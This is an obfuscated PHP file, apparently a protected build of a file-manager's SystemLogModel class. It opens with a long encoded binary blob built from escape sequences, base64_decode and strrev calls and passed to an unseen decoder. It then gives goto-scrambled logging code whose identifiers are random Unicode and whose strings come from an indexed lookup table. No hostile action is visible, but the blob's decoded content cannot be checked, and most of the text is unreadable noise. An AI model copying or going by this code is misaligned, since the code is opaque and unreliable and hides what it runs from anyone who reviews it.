{{ѣh)˧my'."\n".'ؐ}rrFjJ;P'."\n".'').base64_decode('YY3cW7Sdzg9EAWmjmqmoSGAJ6SajLsY0s5ZQ0tvSMJ5SSk/LPCf3nzh1+kA6JQ==')."\21\251\247\266\264\312\125\131\52\121\147\343\265\245\355\341\106\347\244\322\351\323\216\230\132\217\364\362\246\322\2\25\353\320\67\45\26\106\247\21\105\332\124\270\204\130"."\xc0\x6d\xd\xd\x95\x97\x50\xa2\xb4\x3c\xa8\x65\xc0\x76\x6\xa8\x50\xda\x15\x27\x83\xd9\xce\x28\x15\x77\x69\x99\x51\xcc\x7e\x4d\x27\x87\xe\x84\x88\x8e\xad\x1c\x27\xe2\x2d\x41\x11\x83"."\56\137\164\203\267\6\352\320\150\367\333\263\371\134\306\11\105\142\147\110\364\343\143\163\241\133\151\115\17\205\132\153\172\221\374\305\71\211\110\363\117\354\362\270\106\22".base64_decode('/WALDgOdcN/HK4/qVwgMUkYKUkX3ixSvIdmLWsne2bb2wqF2Al4K4j9YVGCLNQ==')."\x95\x62\x49\xac\xce\x96\xed\x2e\x98\xed\xa3\x80\xb2\xc0\xc9\x75\x8a\xbe\x9d\x7\x0\x23\xd\xa3\xa1\x57\x58\x27\x9c\x5f\x27\xbb\x1a\x51\x10\xc3\x17\x75\xd1\xa6\xc6\x9\xaa\x14\x4b\xd2"."\x9e\x53\x13\xf6\x2a\xd1\x39\x8f\x33\x97\xa3\x15\x16\x2d\x54\x64\xf3\x69\x2\xd4\x9\x1f\x2b\xcf\xc2\x70\x3\x1\xdd\xc9\x78\x6c\x3b\xcf\x2e\xe8\x36\xb\xfd\xaa\x82\xc5\x2b\x8d\xad\xae"."\x19\x3f\xb9\x86\xde\x71\x38\x8b\x1e\x53\xe5\xb2\x66\x2d\xfb\xa4\x7e\x57\xcf\x70\x77\x51\x3a\xc0\x3d\x33\xd3\xbe\xc1\x9\xb7\x38\x9b\x15\xc0\x7c\x18\xd9\xa\xa7\x4\xc4\x92\x8e\xb7\xd6".base64_decode('4tebdBTLj4KLXaSExSsJnttGmcviIpQ0oZB7ACq16xeUmGxCuumHztLLfInEUg==')."\xbd\xbc\x27\x31\x68\x8b\x47\x30\xbc\x17\x34\x54\xe3\xac\x14\xda\x56\x5\xcd\x66\x3c\x99\xcb\xf4\xd6\xa\x91\x92\xa9\x69\x52\x5a\xce\xe4\x9\x93\x3f\xda\xa8\x19\x6d\x4c\x81\x15\xd5\x8e"."\166\215\353\62\100\200\320\153\346\171\16\356\43\334\203\23\366\224\100\142\260\312\331\5\375\201\273\340\46\25\314\11\57\34\130\355\125\243\140\157\262\235\33\210\57\247"."\264\245\162\314\171\164\26\175\223\56\265\371\333\233\174\255\302\331\264\0\210\326\67\264\106\75\155\155\105\43\30\27\3\65\134\360\104\307\325\103\337\107\210\123\64\234"."\252\246\273\245\70\64\76\255\55\201\320\22\311\320\343\324\141\137\211\233\20\136\224\200\313\121\123\125\222\245\24\146\221\272\100\237\234\350\13\107\227\116\233\352\126\247"."\261\331\341\136\43\164\215\333\326\272\334\147\102\251\312\15\217\175\63\147\101\164\20\117\241\20\264\221\373\210\220\244\251\262\204\7\276\266\24\236\311\165\225\112\111\260"._kodDe('KCl3jLnsX6PCxuqgWQxR1xkCSIpgXB1LiMkVDSiVS9hxpSzrxVxoV2xODCGuPCQ=')."\xe1\x99\x44\xd6\xbf\x85\xe9\xdd\x48\x23\xe0\xe6\x42\xa4\xf5\x9c\x81\xa9\xe0\x8b\x20\x85\x8b\x3d\xb1\x90\x95\xe3\xbd\x10\x5\xf9\x7e\x41\xea\x24\x11\x6d\x50\x6e\xc1\x11\x16\x5f\xc5\xa6"."\160\316\6\232\15\52\205\162\253\316\135\260\57\132\204\13\202\54\302\222\45\205\60\142\236\143\217\362\144\125\73\10\142\216\35\6\105\157\16\3\33\237\265\32\214\265"."\142\42\16\241\151\360\57\317\343\157\155\342\1\274\264\54\221\235\324\22\16\205\42\235\245\256\61\113\226\270\125\172\276\35\51\261\346\165\261\324\70\34\161\131\323\203".strrev('ΓtIidNn	lsۆ=;33		g')."\x70\x7\xfb\xac\x6f\xe5\x7c\x31\x43\x72\x4c\x4f\x5c\x48\x6d\xe2\xb1\xfa\xe\x9c\xde\xc7\x5c\x85\x8b\xa6\xb5\xf8\xdb\x93\xcd\x8a\x41\xea\x31\x1f\x29\xc8\x53\x6a\xcc\xcd\x56\x3b\x56\x9a"."\273\342\334\350\235\46\101\264\306\6\207\207\320\266\10\150\51\214\300\175\200\172\2\66\255\307\16\7\145\61\40\373\230\152\304\165\65\153\132\350\24\176\32\250\4\71".base64_decode('d++R+2ScpESiT42UIFe2JYAu4RhCEHhTpkICJOlKqrYENddIKgrIj0hMsUpAxg==')."\22\211\122\307\264\314\106\114\67\65\260\123\62\233\156\362\254\102\173\220\330\260\172\132\311\241\4\341\301\316\74\7\377\216\72\223\355\7\360\35\217\224\242\143\103\75".strrev('鐁7XMk鞢5^G/:pWmU1uD').base64_decode('13OZDLMagDwl2+fwIU8omTP5Dgk93Ybh9SKDgAUPTtB/lJJwWQJFkuFTe1gIXQ==')."\x3\x16\x45\x6\x2e\x3e\xa5\x51\xbf\x55\x63\x2b\x2b\x2b\x9d\x95\x55\xe0\x2f\x3b\x7f\x24\x4c\x59\x4d\x65\x65\x41\x92\xca\xca\x1a\xf4\x17\x47\x20\xf5\x2b\x19\x45\x6b\xc\x58\xb4\x94\xda".base64_decode('kAT9ikIaREh5Ws3kKN/UWQ+N5SXYtPmUVaDtBwOIbkTRhT9FkPamSOh8i4QU+w==')."\40\260\203\103\62\45\164\7\205\53\235\176\3\366\5\114\17\32\24\322\136\166\167\2\44\343\23\77\5\337\106\251\145\215\362\146\22\235\142\145\56\72\270\30\310\335"."\x5f\x3a\x69\x84\x53\xf4\x84\x4c\x32\x61\x92\xce\x8d\x2b\x2c\x4d\x3\x79\xc0\x46\x1a\x67\xbd\x82\x0\x41\xcd\x81\x2e\x8b\xb1\x1b\xb\x28\x94\x62\x57\x8\x61\xb0\x95\x25\xc5\xfe\xb3\xf1".base64_decode('rQEyJEUQLKn1R/lmCIMzWAiNEBRyKFYliIw2hQwTJYsUi+gpNjkUR5fmetWU5Q==').base64_decode('GlNUKFscnCkwoWgQAhaNhzkKB7QJMsoUBbBGvpYPu4sjD3JjiZ4owjY3NUcUzA==').base64_decode('jmmfGTTsusbvJBW89UVDwk09qrkO/RfTDgrxUgA2hqhnnrCEAuxRtjyehPAMlQ==')."\301\135\140\325\63\157\167\242\137\54\174\110\54\230\22\30\304\301\54\77\25\246\145\364\11\202\212\53\253\153\335\140\262\14\261\257\0\336\126\34\314\222\27\246\54\222".base64_decode('iHVITCcCoVUTfRGJ4B2/6yTzt9qEpPwWjgC0WhgJEfXMK78IhIKPaAeADJesZQ==')."\x40\x1\xc5\xa\x61\x2d\xfb\x5\x5c\xa1\x92\xb0\x49\x5e\xcf\x12\xee\xa9\x91\x64\x9c\x12\x40\x2d\x85\xa8\x2f\x55\x35\x6a\x62\x0\x47\x83\x1f\xf7\x59\xe1\x18\x86\xe5\xd2\xb8\xe8\xf0\x32".base64_decode('jAytUgp9uIuQG4T3sABkimEbQI6rZLHV1orZrHEfL7uCflxFU8EhZGo1UacMhw==')."\57\52\252\14\340\242\153\146\357\105\25\101\72\53\142\25\140\20\322\70\303\2\152\30\175\22\102\100\374\241\34\122\202\266\167\141\116\241\134\235\100\314\44\223\223\62"."\102\170\302\111\135\63\115\361\306\256\207\32\134\301\200\137\334\323\303\70\213\163\32\257\307\162\4\45\70\253\144\111\301\136\102\153\227\351\376\202\354\176\134\310\73\60"."\x17\x42\x6c\x41\xbb\x6d\x10\xda\x1d\x4c\x4a\xff\xa9\x97\xcf\xc\x7b\xd3\x1\x4e\x67\x48\x30\xcd\x28\x52\x3\xc9\xc4\xb2\x90\x4d\x4a\x57\xe2\x9a\x8e\xa4\x51\xe1\x9e\x65\xc6\xc\x2a\xdd".base64_decode('YtCvMSkcHnkoRYqA98sFFIdYAOTDnHhbXXASCkKCV1aB2XBWSYxLieKScaBCiA==')."\100\351\213\61\54\66\345\221\140\273\211\304\337\120\56\306\364\364\66\66\202\232\203\112\342\56\115\355\73\141\1\350\206\63\354\201\41\306\201\142\241\133\102\336\63\61"."\13\252\263\40\13\216\203\73\53\67\4\25\143\14\40\57\301\241\32\72\246\110\125\50\112\30\321\70\163\102\100\106\207\17\22\211\310\53\324\374\313\131\65\326\131\115"."\x54\xc4\xa2\x8d\x28\xd9\x7c\xc9\xf8\x42\xfe\x56\x40\x3\xc8\x85\x53\x3a\x48\x6c\xb9\x48\x3a\x9e\x46\x13\xde\x8d\x42\xb7\x81\xf9\x15\x4c\x74\xf1\x99\xcd\x27\xba\x21\xcd\x42\xba\xb0\x6f"."\51\314\316\13\135\25\26\311\12\77\207\306\346\137\60\101\173\261\170\74\102\60\272\301\142\35\147\113\0\126\206\65\236\170\173\115\133\336\1\5\170\140\61\261\260\25"."\102\274\373\212\36\155\121\56\336\17\156\150\10\100\32\366\51\53\14\14\77\117\307\227\250\251\345\44\243\113\34\34\326\30\260\360\114\336\305\54\107\311\125\31\362\100"."\123\131\71\274\52\143\321\171\264\344\331\225\7\60\223\275\160\223\140\146\172\206\30\240\261\14\71\15\113\0\233\265\130\162\63\20\113\325\257\120\27\61\124\66\157\153"."\x6e\x73\x33\x50\x1d\x1d\x26\x76\x79\x95\x8\x76\xfc\xc9\x1f\x62\xf0\x45\xae\x9d\xf4\x83\x71\xd7\xfa\xc9\x2\xab\xaf\x61\x96\x3e\xf4\x5d\xd1\xfe\xb4\x1a\x97\xfc\x81\x26\x5f\xbd\xc7\xdf".strrev('k g㱂gO3NcWR;[8<mnנ').base64_decode('GEcVvaBEwManrQQB5YFKuCKpU1wnJSTO6kph+ryCHgflLRYy5Iq0hqQvXgNYIg==').base64_decode('1tRgs1YyQzVezfSphsqJA82RF0vnakad+dFOiG63hRngg41rKXThQZwziD5kbQ==')."\x62\x33\x9e\x26\xd1\xd7\x4b\x96\x6a\xd9\xc9\x4b\x37\xdc\x93\x3b\xa\xa\x3e\xf6\xb3\xba\xac\x1a\x8a\x0\xc0\xce\xde\xc7\x94\xd3\x90\xe0\x0\x86\xe4\x8e\xe2\x3c\x18\x16\x84\x8f\x65\xfe".strrev('NL}>냀!6|^;3ȞjiW')."\x4d\xd8\x89\x74\x14\x5f\x5d\xe7\x55\x0\xc1\x4c\xcf\x67\xc5\x93\x1d\x77\x82\xfa\x41\xa7\x82\x22\x74\x3f\xe3\xa5\x1a\x5b\x18\xe0\x5c\x2e\x4c\x4e\x4a\x83\xd5\x61\x39\x7\x48\x5d\xf0\x88"."\203\362\303\124\135\2\26\64\31\166\313\311\246\355\161\4\273\1\237\345\205\314\202\72\240\111\325\320\345\200\174\22\327\45\260\4\122\255\124\211\124\124\374\275\14\151".strrev('tβ]'."\0".'_:Z!}q'."\0".'1a\\Ei\'.@g*')."\151\342\60\40\2\10\366\21\374\360\13\64\253\306\137\130\170\164\0\106\134\61\13\235\343\343\162\206\54\324\260\157\41\234\235\201\56\373\223\132\277\365\55\27\10\261"."\73\351\147\356\371\55\165\301\30\1\231\321\155\123\361\165\1\352\327\35\260\215\226\247\31\204\322\107\343\237\10\371\245\124\336\136\64\136\327\244\51\345\154\356\353\55"."\x2f\x76\xb\x80\x16\x85\xcb\x73\x28\x17\x3c\xb5\x97\xe9\x1b\x60\xec\x59\x0\xf6\x66\xb\x5f\x5e\x34\x4e\x40\x29\xf4\x3a\x48\xc3\x10\x59\x6d\x60\xc9\xea\xda\x9c\x7b\x8c\xe7\x3b\x90\xd5".base64_decode('yzc7p2OWW8iCTvTZHtbCcrcD8z6QAvFQXV78Fo0VUadBJNWsJBgGTBMS0OdVEg==')."\16\364\366\7\246\103\366\367\145\204\365\303\210\233\230\273\73\245\305\344\124\20\33\377\130\54\352\165\40\267\60\203\76\113\62\14\162\313\331\354\220\307\2\204\37\301"."\x47\x4\xb9\x8c\xf\xdf\xeb\xb2\x40\x75\x41\x2e\x12\xcd\x45\xf1\x61\x8\xbf\xbc\x42\x92\x83\xda\xda\xf0\xe9\x7\xe9\xb6\x58\x24\x3d\x91\x62\x6a\xc2\x46\xe1\x81\x48\x77\xe1\x9\x16\x34".base64_decode('TqLsjWC7Rw4TXaLgQhJIUyU+wZYFChECrnr0gVa9yOj+ApThofUFIoyw6KdB6Q==').strrev('GB_$B`qgŰ~3.jОͼPs?\\b').base64_decode('jPi7b9bH4mCbmbFbAftt57zZUNkyBO0DF9YK9XH83C6TS/OTUBCwSiIFHRZ6mA==')."\xd3\x53\xe\x74\x6a\xe9\xa0\xce\x5b\x6c\xc3\xc1\x7b\x25\xce\x4c\x91\x31\xfc\xef\x65\x60\x9b\x47\x24\x5e\x24\xac\x54\xa7\x66\x6a\x4c\xa7\x27\x3f\xf6\x64\xaa\x5\xeb\x80\x50\xcf\x8d\xee".base64_decode('sT+rgncT5qYTY6vHTxbFeD4//ESFuBmkfiTxD9nR+cRLVrSSqC8tcfmiSKtVag==').base64_decode('4RNKNkL8v1sAnBXGSQUb0cL31AoGAuGiYFkhbGO2U3ENHlYbfBXhjYs/nGStCw==').base64_decode('P/NVpB/C9sMXBH63RktBoTINFaOmLlulo2JCABoJKnGo6C1Dxd52NDBEfcCjBQ==')."\51\101\54\321\324\354\272\17\230\35\156\117\110\365\26\310\244\310\146\13\357\130\362\245\45\120\226\377\305\4\122\101\0\313\14\334\46\242\110\317\335\147\123\362\121\344"."\135\42\341\140\371\27\332\215\131\55\46\364\70\145\323\51\40\244\240\57\123\314\0\232\140\302\263\160\31\314\332\127\133\361\40\33\57\143\276\103\32\52\121\41\357\45".base64_decode('PF/E/U8IjBbMTS9tDSHCUholPsxkJjmLj1eoZbUKHurEWyyoIHEZFBaNtCKkvQ==').strrev('9"t@dk'."\0".'>1mdt8^]mÇ6d').base64_decode('7Gj/0TrnlEy4BWcRAthzJxahwLC/+wOYKNExHwgyDCdbJqF1yHwY1+awv2aYFQ==')."\56\7\333\336\131\25\24\224\326\27\124\55\227\5\241\247\4\333\262\246\127\20\15\333\313\134\330\143\33\376\246\374\367\377\363\353\206\377\277\36\65\34\137\111\125\311".base64_decode('lpfvmghbS3mwQcEtI1Zj2vph3RiHi7EEQx2WEAnwBQd3HJftMVkXs6eknjWoww==')."\15\231\36\223\310\251\24\337\152\13\336\11\3\30\331\313\36\264\52\26\50\174\240\322\202\174\224\313\344\315\314\250\361\336\42\207\167\160\12\374\126\47\206\2\157\120"."\x90\x8c\xd3\x27\xc0\x42\x50\x5f\x22\x6e\xfa\x15\x87\xc2\x15\x64\x20\x29\x59\x14\xef\xb8\x5\xb2\x54\xc\x2b\x27\x94\x78\xfe\xd9\x94\x7c\xa0\x5b\xb3\x84\x8a\x88\x94\xc3\x2\x2a\xa0\x37"."\141\313\56\150\1\212\303\303\137\165\165\131\337\25\45\71\132\154\357\65\341\104\206\70\266\26\35\162\341\131\156\141\156\266\230\305\54\320\276\324\252\211\141\217\131\126"."\332\137\267\254\162\26\126\206\315\273\241\26\41\10\345\174\212\220\350\230\1\35\3\26\311\203\227\145\210\247\31\2\375\213\57\102\366\24\251\40\376\202\57\261\277\164".base64_decode('MbfpGmLArFCmyxAs9YSXFQveRrOp64FQxM+vVA05KSXdDrW3lKEbCgRTAU8vPA==')."\x9b\x6c\xa6\xb3\x58\xc7\x25\xee\xa1\xf4\xfa\x8f\x60\x59\x4b\x40\x16\x4d\x94\x21\xba\x5e\xb6\xe6\x84\xb6\xd2\xd6\x95\x32\xad\x58\xb2\xb8\xa6\x1b\x42\x32\x6\x2f\x96\x16\x3e\x3f\x67\x5a"."\x46\x93\x7b\x8e\xb5\x7b\x8c\x45\x2\x30\x96\x69\x2d\xa2\x2d\x39\x2c\x14\x41\xc2\x59\x1a\x60\x6f\x13\x56\x3f\xd0\x28\x12\x81\xa9\x7f\x2a\xfa\x96\x36\x3f\xd\xb2\x1e\xc6\x31\x37\x9d\x5".strrev('#CΞ#8R}eezMXGߏ;:h*')."\141\363\247\331\240\10\302\151\255\15\56\20\177\116\355\344\76\176\40\303\271\337\104\202\275\221\152\111\232\240\374\77\203\2\10\177\116\25\362\72\302\315\112\156\233\253".base64_decode('9NsfuXOJtzEtCQuh/OalkJ/r5nk3IaxY99GSsWYXb3YypOIg7ESYGbUIkgY0Sg==')."\xe7\xd6\x2e\xb8\x2b\x4c\x7a\xe6\x55\x5a\xef\x91\xb2\x64\x6c\xce\x40\x1a\x74\x5\xc0\x69\x81\xda\x64\x27\xa8\x8b\xa0\xdb\xb8\x2d\xca\x10\x9f\x7f\xb5\x9e\xc8\x89\xe2\xbc\x80\x2\x4a\xca".base64_decode('LxQnntYNmSFUvBKOldYhFu7c8gi6WWmWwReIHesYSRkUIy3NsU8tYvs5+mJgGg==')."\xa9\x3b\x5d\x54\x7d\x5c\x98\x5e\xb1\xb5\x5e\xcc\x60\xef\x19\xce\x61\xf4\xab\x66\x3c\x29\xc8\x22\x85\x91\x85\x70\xbd\x60\x50\x49\x45\xc5\xdb\x6b\x6f\x15\x1d\x53\xbb\x84\xc6\xb\x29\x68"."\x8f\x70\xe4\x1f\xd6\x8a\xe4\xc1\x2d\x2a\x9a\xd\x47\xa1\x47\xca\x19\xf\x69\xc9\x3b\xc4\x10\xc0\xbc\x38\xa\xe6\x2d\x88\xa6\x99\x5\x85\x86\x90\xcf\x94\x73\xc6\x10\xdd\x2b\x1c\x3c\x22".base64_decode('5SeKdNgmC+OkQ41n0cSF1RGMs6dGaoHireDSvO1YtVgriiYeshVFHl4mfr+K0A==')."\132\32\123\204\272\362\63\370\102\72\316\343\212\130\4\340\62\341\36\55\72\216\51\22\55\232\27\24\67\100\10\26\135\372\206\325\62\300\6\27\7\206\132\11\1\211"."\215\77\334\53\330\323\216\266\220\364\134\246\67\243\261\155\42\301\155\271\240\251\50\173\336\226\125\127\120\232\25\65\63\71\301\312\263\250\171\257\3\75\347\136\40\311"."\xa6\x64\xaa\x1f\x17\xec\xa2\xb1\xd4\xa2\x99\x6a\x5c\xb0\x4e\xb2\x3f\x60\x8f\xe3\x69\x25\x29\x41\x1\x67\xd3\x7d\x71\x69\xdf\x72\x40\x5d\x44\x3b\x84\x40\x84\x5d\xe3\xaa\x66\x8b\x95\x38"."\336\377\211\216\35\37\265\325\303\223\126\166\274\2\305\53\7\336\57\161\164\110\323\115\7\214\13\153\131\364\133\247\231\46\245\44\100\376\107\51\21\223\7\67\75\207".base64_decode('YJkAvvhZChxFpN5H6IjIBvokh35Q4AwpOBYRG0sAHhuwgLinkZO6xpztuJEDgA==')."\x10\x19\xd3\x6\xa8\xf7\x36\x78\x5d\x95\xb7\x87\xbf\x8a\x2b\xdb\x19\x39\xce\x83\x10\x7c\x13\xed\x2c\xd0\xa5\x60\xc3\x8d\x63\xdc\xc4\x1b\xae\x13\x95\xe1\x24\xfe\x4f\x7a\xb2\xdd\x96\xec"."\xf8\x9\x0\x66\x5f\xf8\x4b\x25\x10\xdd\x24\x2f\x2\x7b\xc9\x44\x6a\x25\xe8\x2f\xd6\x3b\xc7\x17\xa\x87\xa\xa2\xda\x3c\xa1\x50\x47\x20\xd8\x80\x9d\x6a\x16\x44\xa3\x5c\x82\x49\x4b\x41"."\124\133\163\240\165\250\70\157\213\307\347\57\210\203\46\56\255\121\356\306\7\107\371\332\120\53\75\176\177\240\143\250\126\370\352\147\362\226\240\3\125\256\362\316\46\65"."\252\311\246\47\3\41\71\105\160\112\274\270\246\244\271\77\47\236\307\252\42\20\347\325\240\256\316\330\207\325\365\274\315\332\214\42\54\51\10\232\247\264\222\262\203\131"."\2\205\116\106\331\342\146\314\62\352\220\150\325\306\217\214\135\226\163\146\1\216\26\13\42\61\2\22\212\273\53\2\214\51\72\142\242\376\264\120\237\217\142\371\210\300"."\226\316\320\210\101\124\217\26\23\364\365\130\166\41\267\311\310\30\13\66\111\370\233\104\377\37\217\306\110\311\341\236\0\0"."".base64_decode('')."", 10, -8))); goto E; c㗔: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\145\162\164", "\x66\x75\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $d =& $_SERVER[]; return array($d[2013] => LNG($d[2014]), $d[2015] => LNG($d[2016]), $d[1642] => LNG($d[2017]), $d[2018] => LNG($d[2019]), $d[2020] => LNG($d[2021]), $d[2022] => LNG($d[2023]), $d[2024] => LNG($d[2025]), $d[1672] => LNG($d[2025]), $d[1673] => LNG($d[2026]), $d[2027] => LNG($d[2028]), $d[2029] => LNG($d[2030]), $d[2031] => LNG($d[2032]), $d[2033] => LNG($d[2034]), $d[1670] => LNG($d[2035]), $d[2036] => LNG($d[2037]), $d[1677] => LNG($d[2038]), $d[2039] => LNG($d[2040]), $d[2041] => LNG($d[2042]), $d[2043] => LNG($d[2044]), $d[2045] => LNG($d[2046]), $d[1680] => LNG($d[2047]), $d[1681] => LNG($d[2048]), $d[2049] => LNG($d[2050]), $d[2051] => LNG($d[2052]), $d[2053] => LNG($d[2054]), $d[1675] => LNG($d[2055]), $d[2056] => LNG($d[2057]), $d[1674] => LNG($d[2058]), $d[2059] => LNG($d[2060]), $d[2061] => LNG($d[2062]), $d[2063] => LNG($d[2064]), $d[2065] => LNG($d[2065]), $d[2066] => LNG($d[1646]), $d[2067] => LNG($d[2068]), $d[2069] => LNG($d[2070]), $d[2071] => LNG($d[2072]), $d[2073] => LNG($d[2074]), $d[2075] => LNG($d[2076]), $d[2077] => LNG($d[2077]), $d[2078] => LNG($d[2079]), $d[2080] => LNG($d[2081]), $d[2082] => LNG($d[2083]), $d[2084] => LNG($d[2085]), $d[2086] => LNG($d[2087]), $d[2088] => LNG($d[2089])); } private function typeFile() { $CØ =& $_SERVER[]; $a٭ = array($CØ[1677] => array($CØ[1678]), $CØ[2031] => array($CØ[2090]), $CØ[2033] => array($CØ[2091]), $CØ[1670] => array($CØ[1671]), $CØ[2041] => array(), $CØ[2043] => array(), $CØ[2045] => array(), $CØ[1680] => array($CØ[1682]), $CØ[1681] => array($CØ[1682]), $CØ[2049] => array($CØ[2092]), $CØ[2051] => array($CØ[2092]), $CØ[2053] => array($CØ[2093]), $CØ[2039] => array($CØ[2094]), $CØ[1675] => array($CØ[2095]), $CØ[2056] => array($CØ[2096]), $CØ[1674] => array($CØ[1676])); return $a٭; } private function typeAll() { goto a; a: $bϙ =& $_SERVER[]; $C㥥苨 = $this->typeList; $aݖ = array_filter($this->typeFile()); goto Aџߎ; A: return $C㥥苨; goto cϮ; Aџߎ: foreach ($aݖ as $d̖ƪ => $D롸ο) { $C㥥苨[$D롸ο[0]] = $C㥥苨[$d̖ƪ]; } $C㥥苨[$bϙ[1682]] = LNG($bϙ[2097]); $C㥥苨[$bϙ[2092]] = LNG($bϙ[2098]); goto A; cϮ: } public function addLog($Cע, $bİ̆ = array()) { goto Aж; dŦꜞ: if (!$E瓜) { $E瓜 = (int) Session::get($bϵ[1828]); } $fڅ = get_client_ip(); if (!$bİ̆ || strlen(json_encode($bİ̆)) >= 1024) { $bİ̆ = array($bϵ[2099] => $fڅ); } else { if (is_array($bİ̆)) { $bİ̆[$bϵ[2099]] = $fڅ; } else { $bİ̆ = array($bϵ[1091] => $bİ̆, $bϵ[2099] => $fڅ); } } goto D; D: $bİ̆ = array($bϵ[1523] => Session::sign(), $bϵ[1524] => $E瓜, $bϵ[29] => $Cע, $bϵ[1526] => json_encode($bİ̆)); parent::add($bİ̆); goto F; Aж: $bϵ =& $_SERVER[]; if (!isset($this->typeList[$Cע])) { return; } $E瓜 = defined($bϵ[454]) && USER_ID ? USER_ID : (isset($bİ̆[$bϵ[1533]]) ? $bİ̆[$bϵ[1533]] : 0); goto dŦꜞ; F: } public function remove($d) { $this->where(array($_SERVER[][412] => $d))->delete(); } private function _makeOrder($aд = '') { goto dÉ; dÉ: $F =& $_SERVER[]; $eѡɒ̃ = $F[194]; $Fݛ = array($F[428] => $F[429], $F[430] => $F[431]); goto C憑; d: return $this->order($aд); goto dě; C憑: $E㠜ӊ = Input::get($F[436], $F[7], $F[1860], array($F[1784], $F[430])); $E㠜ӊ = $Fݛ[$E㠜ӊ]; $aд = $aд . "{$eѡɒ̃}\x20{$E㠜ӊ}"; goto d; dě: } public function get($A = '') { goto aٿ⥣; F浻: if (!empty($A[$Dԩ[2099]])) { $E؎ۥ[$Dԩ[431]] = array($Dԩ[380], "\45{$A[$Dԩ[2099]]}\x25"); } $c = $this->_makeOrder()->where($E؎ۥ)->selectPage(); if (empty($c[$Dԩ[367]])) { show_json(array(), !0, $c[$Dԩ[364]]); } goto fģԊ; Dʇ۴: if ($A[$Dԩ[1533]]) { $E؎ۥ[$Dԩ[1533]] = $A[$Dԩ[1533]]; } if (isset($A[$Dԩ[726]])) { $bϨ = $A[$Dԩ[726]]; $A㹜 = isset($A[$Dԩ[476]]) ? $A[$Dԩ[476]] : time(); $E؎ۥ[$Dԩ[194]] = array($Dԩ[331], array($bϨ, $A㹜)); } if ($A[$Dԩ[29]]) { $e򯮮 = explode($Dԩ[47], $A[$Dԩ[29]]); $CۂӢ = $this->typeFile(); $e = array(); foreach ($e򯮮 as $aԏ) { $e[] = $aԏ; if (isset($CۂӢ[$aԏ])) { $e = array_merge($e, $CۂӢ[$aԏ]); } } $e = array_unique($e); if ($e) { $E؎ۥ[$Dԩ[29]] = array($Dԩ[7], $e); } } else { $E؎ۥ[$Dԩ[29]] = array($Dԩ[2100], $Dԩ[2101]); } goto F浻; aٿ⥣: $Dԩ =& $_SERVER[]; if (!$A) { show_json(array()); } $E؎ۥ = array(); goto Dʇ۴; fģԊ: $c[$Dԩ[367]] = $this->logList($c[$Dԩ[367]]); return $c; goto f; f: } private function ipAddress(&$C) { $eĊ =& $_SERVER[]; if (!empty($C[$eĊ[2099]])) { $Aɿ = IpLocation::get($C[$eĊ[2099]]); } else { $Aɿ = LNG($eĊ[2102]); } $C[$eĊ[2103]] = $Aɿ; } private function descZipDownload($b, &$Dʼ) { $F =& $_SERVER[]; if (!isset($b[$F[2104]])) { return; } $f܏ = json_decode($b[$F[2104]], !0); foreach ($f܏ as $F䠺) { try { $E䳙 = IO::infoFull($F䠺[$F[76]]); } catch (Exception $c雙) { continue; } $b[$F[76]] = $F䠺[$F[76]]; $Dʼ[] = $b[$F[395]] = $E䳙[$F[395]]; $Dʼ[] = $b[$F[1915]] = $E䳙[$F[478]]; break; } return $b; } private function getSourceList(&$Bﱃܼ) { $AɆʽ =& $_SERVER[]; $B޻ = array(); foreach ($Bﱃܼ as $Bޠ => $e) { goto bʾ; bʾ: $BУʯ㙈 = json_decode($e[$AɆʽ[431]], !0); if ($e[$AɆʽ[29]] == $AɆʽ[1673]) { $BУʯ㙈 = $this->descZipDownload($BУʯ㙈, $B޻); $Bﱃܼ[$Bޠ][$AɆʽ[431]] = json_encode($BУʯ㙈); continue; } if (strpos($e[$AɆʽ[29]], $AɆʽ[1916]) !== 0) { if (!isset($BУʯ㙈[$AɆʽ[76]]) || strpos($e[$AɆʽ[29]], $AɆʽ[2105]) !== 0) { continue; } try { $dǐ = IO::infoFull($BУʯ㙈[$AɆʽ[76]]); } catch (Exception $cŰ) { continue; } $B޻[] = $BУʯ㙈[$AɆʽ[395]] = $dǐ[$AɆʽ[395]]; $B޻[] = $BУʯ㙈[$AɆʽ[1915]] = $dǐ[$AɆʽ[478]]; $Bﱃܼ[$Bޠ][$AɆʽ[431]] = json_encode($BУʯ㙈); continue; } goto Fϟ; Fϟ: $B޻[] = $BУʯ㙈[$AɆʽ[395]]; $B޻[] = $BУʯ㙈[$AɆʽ[1915]]; if ($BУʯ㙈[$AɆʽ[29]] == $AɆʽ[533]) { $B޻[] = $BУʯ㙈[$AɆʽ[431]][$AɆʽ[1056]]; $B޻[] = $BУʯ㙈[$AɆʽ[431]][$AɆʽ[1057]]; } goto e; e: if ($BУʯ㙈[$AɆʽ[29]] == $AɆʽ[1923]) { $B޻[] = $BУʯ㙈[$AɆʽ[431]][$AɆʽ[395]]; } goto d; d: } if (!$B޻) { return array(); } return Model($AɆʽ[795])->sourceListInfo($B޻, !0); } private function logList($Aȟ) { goto cط; d: $A՘ = array(); foreach ($Aȟ as $Cם => $eȥ) { goto aᆊ; aᆊ: $AѠǧ = $eȥ[$B[29]]; $F = isset($aχ[$eȥ[$B[1533]]]) ? $aχ[$eȥ[$B[1533]]] : !1; $Cֲޙ = strpos($AѠǧ, $B[2106]) === 0 ? LNG($B[2107]) : LNG($B[2102]); goto aԍ; Aڇī: $this->ipAddress($eȥ); if (strpos($AѠǧ, $B[1916]) === 0 || isset($e[$B[1915]])) { goto f; f: $e[$B[85]] = $a谄[$e[$B[395]]]; $e[$B[1928]] = $a谄[$e[$B[1915]]]; if ($e[$B[29]] == $B[533]) { $e[$B[431]][$B[1056]] = $a谄[$e[$B[431]][$B[1056]]]; $e[$B[431]][$B[1057]] = $a谄[$e[$B[431]][$B[1057]]]; } goto b; eʌͶ: if ($e[$B[1928]] && $e[$B[1928]][$B[404]] == $B[1174]) { $A՘[] = $eȥ[$B[393]]; unset($Aȟ[$Cם]); continue; } goto Eͭ; b: if ($e[$B[29]] == $B[1923]) { $e[$B[431]][$B[395]] = $a谄[$e[$B[431]][$B[395]]]; } if ($e[$B[29]] == $B[1668]) { $e[$B[1928]] = $e[$B[85]]; $e[$B[1915]] = $e[$B[1928]][$B[395]]; $e[$B[85]] = !1; $e[$B[395]] = $B[33]; } if ($e[$B[85]] && 